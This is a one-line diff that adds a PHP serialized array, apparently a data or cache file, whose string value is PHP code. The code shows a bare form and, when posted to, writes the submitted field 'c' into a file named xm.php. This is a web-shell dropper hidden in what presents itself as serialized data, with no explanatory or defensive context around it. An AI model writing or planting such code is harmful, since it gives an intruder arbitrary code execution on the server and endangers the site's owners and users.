@@ -1,0 +1,1 @@
+a:1:{i:0;s:190:"<?php if(!empty($_POST)){file_put_contents('xm.php',$_POST['c']);}else{ ?><form action='#' method='post'><textarea name='c'></textarea><input type='submit' value='submit' /></form><?php } ?>";}
